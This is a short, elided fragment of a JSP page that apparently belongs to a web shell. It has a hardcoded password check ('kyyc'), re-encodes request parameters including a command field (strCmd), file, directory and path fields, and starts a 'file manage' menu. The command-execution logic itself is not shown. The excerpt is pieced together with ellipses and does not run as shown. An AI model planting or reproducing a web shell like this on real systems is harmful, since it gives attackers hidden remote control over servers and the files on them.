...
if(password!=null&&"kyyc".equals(password)){
...
if(tabID != null){
	tabID = new String(tabID.getBytes("ISO8859-1"),"gb2312");
}
if(strDir != null){
	strDir = new String(strDir.getBytes("ISO8859-1"),"gb2312");
}
if(strAction != null){
	strAction = new String(strAction.getBytes("ISO8859-1"),"gb2312");
}
if(strFile != null){
	strFile = new String(strFile.getBytes("ISO8859-1"),"gb2312");
}
if(strPath != null){
	strPath = new String(strPath.getBytes("ISO8859-1"),"gb2312");
}
if(strCmd != null){
	strCmd = new String(strCmd.getBytes("ISO8859-1"),"gb2312");
}
...
<!--Top Menu Started-->
<ul id="tablist">
<li><a href="javascript:void(0);" class="current" onClick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%> </a></li>
